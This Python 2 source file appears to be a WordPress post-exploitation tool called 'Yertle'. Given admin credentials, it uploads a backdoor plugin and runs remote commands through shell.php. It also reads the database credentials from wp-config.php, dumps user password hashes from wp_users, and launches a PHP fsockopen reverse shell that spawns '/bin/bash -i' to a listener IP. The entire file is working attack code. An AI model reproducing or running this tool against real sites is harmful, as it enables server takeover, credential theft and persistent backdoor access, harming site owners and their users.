import re
import sys
import base64
import requests
import argparse
from random import choice
from string import ascii_lowercase
__author__ = '(n00py)'


def uploadbackdoor(host,username,password,type,verbose):
    url = host + '/wp-login.php'
    headers = {'user-agent': 'Yertle backdoor uploader',
               'Accept-Encoding' : 'none'
    }
    payload = {'log': username,
               'pwd': password,
               'rememberme': 'forever',
               'wp-submit': 'log In',
               'redirect_to': host + '/wp-admin/',
               'testcookie': 1,
               }
    uploaddir = (''.join(choice(ascii_lowercase) for i in range(7)))
    session = requests.Session()

    r = session.post(url, headers=headers, data=payload)
    if verbose is True:
        print "Server Header: " + r.headers['Server']
    if r.status_code == 200:
        if verbose is True:
            print "Found Login Page"
    r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers)
    if r3.status_code == 200:
        if verbose is True:
            print "Logged in as Admin"
    look_for = 'name="_wpnonce" value="'
    try:
        nonceText = r3.text.split(look_for, 1)[1]
        nonce = nonceText[0:10]
        if verbose is True:
            print "Found CSRF Token: " + nonce
    except:
        print "Didn't find nonce"

    files = {'pluginzip': (uploaddir + '.zip', open(type +'.zip', 'rb')),
             '_wpnonce': (None, nonce),
             '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
             'install-plugin-submit': (None,'Install Now')

             }
    r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files)
    if r.status_code == 200:
        print "Backdoor uploaded!"
        if "Plugin installed successfully" in r4.text:
            if verbose is True:
                print "Plugin installed successfully"

        if "Destination folder already exists" in r4.text:
            if verbose is True:
                print "Destination folder already exists"
    print "Upload Directory: " + uploaddir
    return uploaddir


def commandloop(host,uploaddir):
    while True:
        cmd = raw_input('os-shell> ')
        params = [('cmd', cmd.encode('base64'))]
        if (cmd == "quit") or (cmd == "exit"):
            sys.exit(2)
        if cmd == "help":
            print "Except for the commands 'help', 'exit', and 'quit' the command will be ran on the remote host"
        if cmd == "dbcreds":
            datacreds(host,uploaddir)
        if cmd == "hashdump":
            hashdump(host, uploaddir)
        if cmd == "upgrade":
            upgrade(host, uploaddir)
        else:
            print "Sent command: " + cmd
            sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
            print sendcommand.text

def reverseshell(host, ip, port,uploaddir):
    params = [('ip', ip), ('port', port)]
    print "Sending reverse shell to " + ip + " port " + port
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/reverse.php", params=params)


def datacreds(host,uploaddir):
    params = [('cmd', 'cat ../../../wp-config.php'.encode('base64'))]
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    #print sendcommand.text

    user =  credextract(sendcommand.text, 'DB_USER')
    password = credextract(sendcommand.text, 'DB_PASSWORD')
    host = credextract(sendcommand.text, 'DB_HOST')
    db = credextract(sendcommand.text, 'DB_NAME')
    #print "user: " + user
    #print "password: " + password
    #print "host: " + host
    #print "database: " + db
    return host, user, password, db


def credextract(list, key):
    s = list
    start = s.find(key)
    end = s.find(';', start)
    s = s[start:end]
    se = s.split("'")
    return se[2]

def upgrade(host,uploaddir):
    ip = raw_input('IP Address: ')
    port = raw_input('Port: ')
    params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
    print "Sending reverse shell to " + ip + " port " + port
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)

def hashdump(host,uploaddir):
    items = datacreds(host, uploaddir)
    dumpfile = '''<?php
$servername = "%s";
$username = "%s";
$password = "%s";
$dbname = "%s";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT ID, user_login, user_pass FROM wp_users";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        echo "ID: " . $row["ID"]. "- Userame: " . $row["user_login"]. "  Password: " . $row["user_pass"]. "\n";
    }
} else {
    echo "0 results";
}
$conn->close();
?> ''' % (items[0], items[1], items[2], items[3])
    payload = dumpfile.encode('base64')

    params = [
    ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    params = [
    ('cmd', 'php hashdump.php'.encode('base64'))]
    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
    print sendcommand.text


def printbanner():
    banner = """\
     _..---.--.    __   __        _   _
   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
 (____.'.-_\____)    | |  __/ |  | |_| |  __/
  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
   (_..)--(.._)'--'         ~n00py~
      Post-exploitation Module for Wordpress

    """
    print banner


def argcheck(interactive,reverse,target):
    if interactive and reverse:
        print "-i and -r are mutually exclusive"
        sys.exit()

    if interactive is False and reverse is False:
        print "You must choose a type of shell: --reverse or --interactive"
        sys.exit()

    if "http" not in target:
        print"Please include the protocol in the URL"
        sys.exit()


def main():
    parser = argparse.ArgumentParser(description='This a post-exploitation module for Wordpress')
    parser.add_argument('-i','--interactive', help='Interactive command shell',required=False, action='store_true')
    parser.add_argument('-r','--reverse',help='Reverse Shell', required=False, action='store_true')
    parser.add_argument('-t','--target',help='URL of target', required=True)
    parser.add_argument('-u','--username',help='Admin username', required=False)
    parser.add_argument('-p','--password',help='Admin password', required=False)
    parser.add_argument('-li','--ip',help='Listener IP', required=False)
    parser.add_argument('-lp','--port',help='Listener Port', required=False)
    parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
    parser.add_argument('-e','--existing',help=' Skips uploading a shell, and connects to existing shell', required=False)
    args = parser.parse_args()
    printbanner()
    argcheck(args.interactive,args.reverse,args.target)
    if args.interactive:
        if args.existing is None:
            if args.username is None or args.password is None:
                print "Username and Password are required"
                sys.exit()
            uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose)
        else:
            uploaddir = args.existing
        commandloop(args.target,uploaddir)

    if args.reverse:
        if args.ip is None or args.port is None:
            print "For a reverse shell, a listening IP and Port are required"
            sys.exit()
        if args.existing is None:
            if args.username is None or args.password is None:
                print "Username and Password are required"
                sys.exit()
            uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse", args.verbose)
        else:
            uploaddir = args.existing
        reverseshell(args.target, args.ip, args.port, uploaddir)


if __name__ == "__main__":
    main()
